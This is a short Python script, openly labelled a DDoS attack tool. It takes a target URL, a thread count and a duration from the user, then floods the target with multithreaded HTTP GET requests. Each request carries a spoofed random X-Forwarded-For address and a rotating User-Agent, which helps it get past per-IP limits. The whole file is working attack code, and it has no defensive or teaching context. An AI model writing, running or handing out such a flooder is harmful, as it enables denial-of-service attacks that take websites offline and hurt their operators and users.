import requests
import threading
import random
import time

# Function to send multiple requests
def send_request(url, stop_event):
    try:
        while not stop_event.is_set():  # Run until the stop event is triggered
            # Generate random IP address and headers
            ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            headers = {
                "X-Forwarded-For": ip_address,
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"
                ])
            }
            
            # Send HTTP GET request to the target URL
            response = requests.get(url, headers=headers, timeout=3)
            
            # Check if the request was successful
            if response.status_code == 200:
                print(f"Request sent to {url} with IP: {ip_address}")
            else:
                print(f"Request failed with status code: {response.status_code}")
    except requests.exceptions.RequestException:
        print("Error occurred while sending a request.")

# Function to start the attack
def start_attack(url, num_threads, duration):
    stop_event = threading.Event()  # Event to stop threads after the duration
    threads = []

    # Launch threads
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, stop_event))
        threads.append(t)
        t.start()

    # Let the attack run for the specified duration
    time.sleep(duration)
    stop_event.set()  # Signal threads to stop

    # Wait for all threads to finish
    for t in threads:
        t.join()

# Get user input for the target URL, number of threads, and duration
url = input("Enter the target URL: ").strip()
num_threads = int(input("Enter the number of threads: "))
duration = int(input("Enter the duration of the attack (in seconds): "))

# Start the enhanced DDoS attack
start_attack(url, num_threads, duration)